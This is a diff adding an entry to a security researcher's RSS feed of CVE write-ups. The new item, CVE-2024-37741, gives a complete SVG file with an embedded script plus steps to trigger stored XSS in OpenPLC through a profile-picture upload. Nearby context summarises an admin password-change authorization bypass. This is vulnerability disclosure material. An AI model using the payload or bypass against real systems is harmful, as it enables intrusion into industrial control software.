@@ -99,5 +99,15 @@ Then the attacker can visit the memo URL &amp;amp; view the memo data of the vic
       <description>Description When setting a password through /admin/users URI, the admin is not allowed to set their own new password through this URI. If they attempt to do so, they receive an error stating Forbidden to operate on yourself. But this is easily bypassable by interacting with the API: if you set a new password for another user, then change the user_id parameter within the request to the admin user ID.</description>
     </item>
     
+    <item>
+      <title>CVE-2024-37741 - XSS on OpenPLC</title>
+      <link>https://1d8.github.io/cves/cve_2024_37741/</link>
+      <pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate>
+      
+      <guid>https://1d8.github.io/cves/cve_2024_37741/</guid>
+      <description>Description Reproduction Use this payload &amp;amp; save it as image.svg:
+&amp;lt;?xml version=&amp;quot;1.0&amp;quot; standalone=&amp;quot;no&amp;quot;?&amp;gt; &amp;lt;!DOCTYPE svg PUBLIC &amp;quot;-//W3C//DTD SVG 1.1//EN&amp;quot; &amp;quot;http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd&amp;quot;&amp;gt; &amp;lt;svg version=&amp;quot;1.1&amp;quot; baseProfile=&amp;quot;full&amp;quot; xmlns=&amp;quot;http://www.w3.org/2000/svg&amp;quot;&amp;gt; &amp;lt;polygon id=&amp;quot;triangle&amp;quot; points=&amp;quot;0,0 0,50 50,0&amp;quot; fill=&amp;quot;#009900&amp;quot; stroke=&amp;quot;#004400&amp;quot;/&amp;gt; &amp;lt;script type=&amp;quot;text/javascript&amp;quot;&amp;gt; alert(&amp;quot;XSS by 1d8&amp;quot;); &amp;lt;/script&amp;gt; &amp;lt;/svg&amp;gt;   Login &amp;gt; Users &amp;gt; Select a user to edit Upload the image.svg as the picture Save changes Right-click the profile image in upper-right hand corner &amp;gt; Open image in new tab  Our XSS payload is now executed</description>
+    </item>
+    
   </channel>
 </rss>
